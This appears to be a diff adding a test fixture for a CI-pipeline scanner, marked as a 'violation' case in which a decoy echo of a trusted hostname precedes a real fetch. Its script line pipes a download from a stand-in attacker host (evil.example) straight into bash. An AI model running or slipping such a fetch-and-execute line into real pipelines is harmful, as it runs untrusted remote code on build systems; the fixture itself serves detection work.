@@ -1,0 +1,9 @@
+# violation: a decoy substitution naming a trusted host earlier on the
+# line must not suppress the real, untrusted fetch later on the same
+# line. The trust decision reads only the substitutions that actually
+# fetch something; a substitution that merely echoes a trusted hostname
+# as plain text is not one of them.
+install:
+  image: alpine:3.19
+  script:
+    - X=$(echo get.docker.com); bash -c "$(curl -fsSL https://evil.example/x.sh)"
